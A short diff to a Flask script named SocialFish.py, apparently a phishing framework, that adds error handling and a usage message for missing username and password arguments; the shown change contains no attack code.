@@ -25,8 +25,11 @@ if len(argv) < 2:
     exit(0)
 
 # Temporario
-users = {argv[1]: {'password': argv[2]}}
-
+try:
+    users = {argv[1]: {'password': argv[2]}}
+except IndexError:
+    print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
+    exit(0)
 # Definicoes do flask
 app = Flask(__name__, static_url_path='',
             static_folder='templates/static')
